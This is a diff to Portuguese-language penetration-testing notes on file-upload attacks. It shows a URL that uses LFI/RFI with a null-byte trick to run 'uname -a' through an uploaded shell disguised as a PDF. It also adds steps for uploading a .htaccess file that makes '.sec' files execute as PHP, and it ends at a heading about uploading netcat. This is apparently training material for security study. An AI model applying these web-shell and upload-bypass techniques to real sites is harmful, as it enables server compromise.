@@ -35,6 +35,15 @@ echo mime_content_type('arquivo.php') . "\n";
 Tente subir o código maliciosa para a aplicação novamente e use o LFI/RFI:
 rh.businesscorp.com.br/index.php?page=uploads/shell.pdf%00&cmd=uname -a
 
+Em alguns casos o código enviado para o site não é interpretado como PHP e ao acessar aparece o seu conteúdo e não executa.
+Nesse caso devemos criar um arquivo .htaccess:
+```pcre
+AddType application/x-httpd-php .sec
+```
+*Acima estamos falando que arquivos com extensão **.sec** devem ser interpretadas como PHP.*
+
+Faça o upload do arquivo .htaccess para a aplicação e tente executar novamente o seu command execution.
+
 ## Fazendo Upload do NC
 
 Criando arquivo nc com bypass:
